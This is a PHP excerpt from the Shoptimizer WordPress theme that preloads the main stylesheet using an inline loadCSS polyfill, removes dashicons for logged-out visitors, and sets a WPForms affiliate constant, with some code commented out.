function ccfw_get_css_handle() {

	// Safe Default.
	$css_handle = 'shoptimizer-main';

	$shoptimizer_general_speed_minify_main_css = '';
	$shoptimizer_general_speed_minify_main_css = shoptimizer_get_option( 'shoptimizer_general_speed_minify_main_css' );

	if ( 'yes' === $shoptimizer_general_speed_minify_main_css ) {
		$css_handle = 'shoptimizer-main-min';
	} else {
		$css_handle = 'shoptimizer-main';
	}

	return $css_handle;
}


/**
 * Replaces a stylesheet link tag with a preload tag.
 *
 * @param string $tag     The link tag as generated by WordPress.
 * @param string $handle  The handle by which the stylesheet is known to WordPress.
 * @param string $href    The URL to the stylesheet, including version number.
 * @param string $media   The media attribute of the stylesheet.
 * @return string The original tag wrapped in a noscript element, followed by the preload tag.
 */
function ccfw_filter_style_loader_tag( $tag, $handle, $href, $media ) {
	global $wp_styles;

	$shoptimizer_css_handle = ccfw_get_css_handle();

	if ( $shoptimizer_css_handle === $handle ) {

		$rel          = 'stylesheet';
		$noscript_tag = $tag;
		$tag          = sprintf(
			'<link rel="preload" as="style" onload="%s" id="%s-css" href="%s" type="text/css" media="%s" />',
			"this.onload=null;this.rel='" . esc_js( $rel ) . "'",
			esc_attr( $handle . '-preload' ),
			esc_url_raw( $href ),
			esc_attr( $media )
		);
		$tag         .= sprintf( '<noscript>%s</noscript>', $noscript_tag );

		// $rel    = 'stylesheet';
		// $footag = $tag;
		// $tag    = sprintf( '<noscript>%s</noscript>', $footag );
		// $tag   .= sprintf(
		// '<link rel="preload" as="style" onload="%s" id="%s-css" href="%s" type="text/css" media="%s" />',
		// "this.onload=null;this.rel='" . esc_js( $rel ) . "'",
		// esc_attr( $handle . ':preload' ),
		// esc_url_raw( $href ),
		// esc_attr( $media )
		// );
		// $tag .= '<script>!function(e){"use strict";var n=function(n,t,o){function i(e){if(a.body)return e();setTimeout(function(){i(e)})}function r(){l.addEventListener&&l.removeEventListener("load",r),l.media=o||"all"}var d,a=e.document,l=a.createElement("link");if(t)d=t;else{var f=(a.body||a.getElementsByTagName("head")[0]).childNodes;d=f[f.length-1]}var s=a.styleSheets;l.rel="stylesheet",l.href=n,l.media="only x",i(function(){d.parentNode.insertBefore(l,t?d:d.nextSibling)});var u=function(e){for(var n=l.href,t=s.length;t--;)if(s[t].href===n)return e();setTimeout(function(){u(e)})};return l.addEventListener&&l.addEventListener("load",r),l.onloadcssdefined=u,u(r),l};"undefined"!=typeof exports?exports.loadCSS=n:e.loadCSS=n}("undefined"!=typeof global?global:this);</script>';
		$tag .= '<script>!function(n){"use strict";n.loadCSS||(n.loadCSS=function(){});var o=loadCSS.relpreload={};if(o.support=function(){var e;try{e=n.document.createElement("link").relList.supports("preload")}catch(t){e=!1}return function(){return e}}(),o.bindMediaToggle=function(t){var e=t.media||"all";function a(){t.media=e}t.addEventListener?t.addEventListener("load",a):t.attachEvent&&t.attachEvent("onload",a),setTimeout(function(){t.rel="stylesheet",t.media="only x"}),setTimeout(a,3e3)},o.poly=function(){if(!o.support())for(var t=n.document.getElementsByTagName("link"),e=0;e<t.length;e++){var a=t[e];"preload"!==a.rel||"style"!==a.getAttribute("as")||a.getAttribute("data-loadcss")||(a.setAttribute("data-loadcss",!0),o.bindMediaToggle(a))}},!o.support()){o.poly();var t=n.setInterval(o.poly,500);n.addEventListener?n.addEventListener("load",function(){o.poly(),n.clearInterval(t)}):n.attachEvent&&n.attachEvent("onload",function(){o.poly(),n.clearInterval(t)})}"undefined"!=typeof exports?exports.loadCSS=loadCSS:n.loadCSS=loadCSS}("undefined"!=typeof global?global:this);</script>';
	}

	return $tag;
}


/**
 * Remove dashicons in frontend for unauthenticated users.
 */
add_action( 'wp_enqueue_scripts', 'shoptimizer_dequeue_dashicons' );
function shoptimizer_dequeue_dashicons() {
	if ( ! is_user_logged_in() ) {
		wp_deregister_style( 'dashicons' );
	}
}

/**
 * WPForms integration check.
 */
if ( ! defined( 'WPFORMS_SHAREASALE_ID' ) ) {
	define( 'WPFORMS_SHAREASALE_ID', '1478967' );
}

// Bring back dequeue fragment as a theme option in future.
// /**
// * Get rid of cart fragments on our homepage.
// */
// add_action( 'wp_enqueue_scripts', 'ccfw_dequeue_woocommerce_cart_fragments', 11 );
// /**
// * Get rid of cart fragments on our homepage.
// */
// function ccfw_dequeue_woocommerce_cart_fragments() {
// if ( is_front_page() || ( is_page_template( 'template-fullwidth-no-heading.php' ) ) ) {
// wp_dequeue_script( 'wc-cart-fragments' );
// }
// }
// $shoptimizer_general_speed_critical_css = '';
// $shoptimizer_general_speed_critical_css = shoptimizer_get_option( 'shoptimizer_general_speed_critical_css' );
// if ( 'yes' === $shoptimizer_general_speed_critical_css ) {
// add_action( 'wp_head', 'ccfw_criticalcss' );
// add_filter( 'style_loader_tag', 'ccfw_filter_style_loader_tag', 10, 4 );
// }
